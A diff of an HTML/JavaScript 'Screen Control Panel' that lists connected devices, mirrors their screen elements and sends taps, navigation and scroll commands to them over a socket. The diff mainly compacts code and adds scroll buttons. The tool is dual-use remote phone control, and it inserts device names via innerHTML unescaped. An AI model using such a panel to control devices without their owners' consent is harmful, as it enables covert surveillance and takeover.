@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Screen Control Panel</title>
     <style>
-        /* आपका मूल डिज़ाइन, जिसमें सुधार किए गए हैं */
         body { font-family: system-ui, sans-serif; background-color: #1e1e1e; color: #e0e0e0; margin: 0; display: flex; height: 100vh; }
         .sidebar { width: 300px; background-color: #252526; border-right: 1px solid #333; display: flex; flex-direction: column; }
         .sidebar h2 { text-align: center; padding: 15px; margin: 0; background-color: #333; font-size: 1.2em; }
@@ -15,71 +14,14 @@
         .device-name { font-weight: bold; }
         .device-info { font-size: 0.8em; color: #999; }
         .main-content { flex-grow: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
-        
-        #screen-viewport {
-            border: 8px solid #444;
-            border-radius: 20px;
-            background-color: #000;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
-            overflow: hidden;
-            margin-bottom: 15px; /* नेविगेशन बार के लिए जगह */
-        }
-        #screen-container {
-            position: relative;
-            background-color: #000;
-            transform-origin: top left;
-        }
-
-        .screen-element {
-            position: absolute;
-            border: 1px solid rgba(0, 255, 255, 0.6);
-            background-color: rgba(0, 139, 139, 0.2);
-            box-sizing: border-box;
-            cursor: pointer;
-            transition: background-color 0.2s;
-            /* ===================================================================== */
-            /* मुख्य सुधार: टेक्स्ट को बीच में लाने के लिए Flexbox */
-            /* ===================================================================== */
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            padding: 2px;
-        }
+        #screen-viewport { border: 8px solid #444; border-radius: 20px; background-color: #000; box-shadow: 0 0 20px rgba(0,0,0,0.5); overflow: hidden; margin-bottom: 15px; }
+        #screen-container { position: relative; background-color: #000; transform-origin: top left; }
+        .screen-element { position: absolute; border: 1px solid rgba(0, 255, 255, 0.6); background-color: rgba(0, 139, 139, 0.2); box-sizing: border-box; cursor: pointer; transition: background-color 0.2s; display: flex; align-items: center; justify-content: center; text-align: center; padding: 2px; }
         .screen-element:hover { background-color: rgba(0, 255, 255, 0.4); }
-        .element-text {
-            color: white;
-            font-size: 12px; /* टेक्स्ट का आकार थोड़ा बड़ा किया */
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            max-width: 100%;
-        }
-
-        /* ===================================================================== */
-        /* नया: नेविगेशन बार के लिए स्टाइल */
-        /* ===================================================================== */
-        #nav-bar {
-            display: flex;
-            gap: 10px;
-            background-color: #252526;
-            padding: 10px;
-            border-radius: 10px;
-        }
-        .nav-button {
-            width: 60px;
-            height: 40px;
-            background-color: #3f3f46;
-            border: 1px solid #555;
-            color: white;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 18px;
-            transition: background-color 0.2s;
-        }
-        .nav-button:hover {
-            background-color: #555;
-        }
+        .element-text { color: white; font-size: 12px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 100%; }
+        #nav-bar { display: flex; gap: 10px; background-color: #252526; padding: 10px; border-radius: 10px; }
+        .nav-button { width: 50px; height: 40px; background-color: #3f3f46; border: 1px solid #555; color: white; border-radius: 5px; cursor: pointer; font-size: 20px; transition: background-color 0.2s; }
+        .nav-button:hover { background-color: #555; }
     </style>
 </head>
 <body>
@@ -91,11 +33,14 @@
         <div id="screen-viewport">
             <div id="screen-container"></div>
         </div>
-        <!-- नया: नेविगेशन बार HTML -->
         <div id="nav-bar">
             <button class="nav-button" id="btn-back">⮌</button>
             <button class="nav-button" id="btn-home">⌂</button>
             <button class="nav-button" id="btn-recents">□</button>
+            <button class="nav-button" id="btn-scroll-up">↑</button>
+            <button class="nav-button" id="btn-scroll-down">↓</button>
+            <button class="nav-button" id="btn-scroll-left">←</button>
+            <button class="nav-button" id="btn-scroll-right">→</button>
         </div>
     </div>
 
@@ -105,126 +50,56 @@
         const deviceListEl = document.getElementById('device-list');
         const screenContainer = document.getElementById('screen-container');
         const screenViewport = document.getElementById('screen-viewport');
-        
-        let devices = {};
-        let activeDeviceId = null;
+        let devices = {}, activeDeviceId = null;
 
-        // --- सर्वर से कनेक्शन और डिवाइस सूची (कोई बदलाव नहीं) ---
-        socket.on('connect', () => { socket.emit('admin_join'); });
+        socket.on('connect', () => socket.emit('admin_join'));
         socket.on('new_device_joined', addDeviceToList);
-        socket.on('device_list', (initialDevices) => {
-            deviceListEl.innerHTML = '';
-            devices = {};
-            initialDevices.forEach(addDeviceToList);
-        });
-        socket.on('device_disconnected', (deviceId) => {
-            const deviceEl = document.getElementById(`device-${deviceId}`);
-            if (deviceEl) deviceEl.remove();
-            delete devices[deviceId];
-            if (activeDeviceId === deviceId) {
-                screenContainer.innerHTML = '';
-                activeDeviceId = null;
-            }
-        });
+        socket.on('device_list', (initialDevices) => { deviceListEl.innerHTML = ''; devices = {}; initialDevices.forEach(addDeviceToList); });
+        socket.on('device_disconnected', (deviceId) => { const el = document.getElementById(`device-${deviceId}`); if (el) el.remove(); delete devices[deviceId]; if (activeDeviceId === deviceId) { screenContainer.innerHTML = ''; activeDeviceId = null; } });
 
         function addDeviceToList(device) {
             if (devices[device.deviceId]) return;
             devices[device.deviceId] = device;
-            const listItem = document.createElement('li');
-            listItem.className = 'device';
-            listItem.id = `device-${device.deviceId}`;
-            listItem.innerHTML = `<div class="device-name">${device.deviceName}</div><div class="device-info">ID: ${device.deviceId} | Battery: ${device.battery}%</div>`;
-            listItem.addEventListener('click', () => {
-                if (activeDeviceId) document.getElementById(`device-${activeDeviceId}`).classList.remove('active');
-                activeDeviceId = device.deviceId;
-                listItem.classList.add('active');
-                screenContainer.innerHTML = 'Waiting for screen data...';
-            });
-            deviceListEl.appendChild(listItem);
+            const li = document.createElement('li');
+            li.className = 'device'; li.id = `device-${device.deviceId}`;
+            li.innerHTML = `<div class="device-name">${device.deviceName}</div><div class="device-info">ID: ${device.deviceId} | Battery: ${device.battery}%</div>`;
+            li.addEventListener('click', () => { if (activeDeviceId) document.getElementById(`device-${activeDeviceId}`).classList.remove('active'); activeDeviceId = device.deviceId; li.classList.add('active'); screenContainer.innerHTML = 'Waiting for screen data...'; });
+            deviceListEl.appendChild(li);
         }
 
-        // --- स्क्रीन अपडेट (सुधार के साथ) ---
         socket.on('screen_update', (data) => {
             if (data.deviceId !== activeDeviceId) return;
             screenContainer.innerHTML = '';
-
-            const remoteWidth = data.screenWidth;
-            const remoteHeight = data.screenHeight;
-            const viewportWidth = 360;
-            const scale = viewportWidth / remoteWidth;
-
-            screenViewport.style.width = viewportWidth + 'px';
-            screenViewport.style.height = (remoteHeight * scale) + 'px';
-            screenContainer.style.width = remoteWidth + 'px';
-            screenContainer.style.height = remoteHeight + 'px';
-            screenContainer.style.transform = `scale(${scale})`;
-
+            const remoteWidth = data.screenWidth, remoteHeight = data.screenHeight;
+            const viewportWidth = 360, scale = viewportWidth / remoteWidth;
+            screenViewport.style.width = viewportWidth + 'px'; screenViewport.style.height = (remoteHeight * scale) + 'px';
+            screenContainer.style.width = remoteWidth + 'px'; screenContainer.style.height = remoteHeight + 'px'; screenContainer.style.transform = `scale(${scale})`;
             data.elements.forEach(element => {
                 const el = document.createElement('div');
                 el.className = 'screen-element';
-                el.style.left = `${element.x}px`;
-                el.style.top = `${element.y}px`;
-                el.style.width = `${element.width}px`;
-                el.style.height = `${element.height}px`;
-
+                el.style.left = `${element.x}px`; el.style.top = `${element.y}px`; el.style.width = `${element.width}px`; el.style.height = `${element.height}px`;
                 const textEl = document.createElement('div');
                 textEl.className = 'element-text';
-                
-                // =====================================================================
-                // मुख्य सुधार: आइकन और टेक्स्ट को पहचानना
-                // =====================================================================
                 let contentDescription = element.contentDescription || "";
-                if (contentDescription.toLowerCase().includes("more options")) {
-                    textEl.textContent = '⋮'; // थ्री-डॉट आइकन
-                    textEl.style.fontSize = '20px';
-                } else if (contentDescription.toLowerCase().includes("navigate up") || contentDescription.toLowerCase().includes("drawer")) {
-                    textEl.textContent = '≡'; // हैमबर्गर आइकन
-                    textEl.style.fontSize = '20px';
-                } else {
-                    textEl.textContent = element.text || contentDescription;
-                }
+                if (contentDescription.toLowerCase().includes("more options")) { textEl.textContent = '⋮'; textEl.style.fontSize = '20px'; }
+                else if (contentDescription.toLowerCase().includes("navigate up") || contentDescription.toLowerCase().includes("drawer")) { textEl.textContent = '≡'; textEl.style.fontSize = '20px'; }
+                else { textEl.textContent = element.text || contentDescription; }
                 el.appendChild(textEl);
-                // =====================================================================
-
-                el.addEventListener('click', () => {
-                    const tapX = element.x + (element.width / 2);
-                    const tapY = element.y + (element.height / 2);
-                    socket.emit('command_to_device', {
-                        deviceId: activeDeviceId,
-                        action: 'touch_command',
-                        payload: { x: Math.round(tapX), y: Math.round(tapY) }
-                    });
-                });
+                el.addEventListener('click', () => { const tapX = element.x + (element.width / 2), tapY = element.y + (element.height / 2); socket.emit('command_to_device', { deviceId: activeDeviceId, action: 'touch_command', payload: { x: Math.round(tapX), y: Math.round(tapY) } }); });
                 screenContainer.appendChild(el);
             });
         });
 
-        // =====================================================================
-        // नया: नेविगेशन और स्क्रॉल कमांड भेजना
-        // =====================================================================
-        function sendGlobalAction(action) {
-            if (!activeDeviceId) return;
-            socket.emit('command_to_device', {
-                deviceId: activeDeviceId,
-                action: 'global_action',
-                payload: { action: action }
-            });
-        }
+        function sendGlobalAction(action) { if (!activeDeviceId) return; socket.emit('command_to_device', { deviceId: activeDeviceId, action: 'global_action', payload: { action: action } }); }
+        function sendScrollAction(direction) { if (!activeDeviceId) return; socket.emit('command_to_device', { deviceId: activeDeviceId, action: 'scroll_action', payload: { direction: direction } }); }
         
         document.getElementById('btn-back').onclick = () => sendGlobalAction('back');
         document.getElementById('btn-home').onclick = () => sendGlobalAction('home');
         document.getElementById('btn-recents').onclick = () => sendGlobalAction('recents');
-
-        // स्क्रॉलिंग के लिए माउस व्हील इवेंट
-        screenViewport.addEventListener('wheel', (event) => {
-            event.preventDefault();
-            const direction = event.deltaY > 0 ? 'down' : 'up';
-            socket.emit('command_to_device', {
-                deviceId: activeDeviceId,
-                action: 'scroll_action',
-                payload: { direction: direction }
-            });
-        });
+        document.getElementById('btn-scroll-up').onclick = () => sendScrollAction('up');
+        document.getElementById('btn-scroll-down').onclick = () => sendScrollAction('down');
+        document.getElementById('btn-scroll-left').onclick = () => sendScrollAction('left');
+        document.getElementById('btn-scroll-right').onclick = () => sendScrollAction('right');
     </script>
 </body>
 </html>
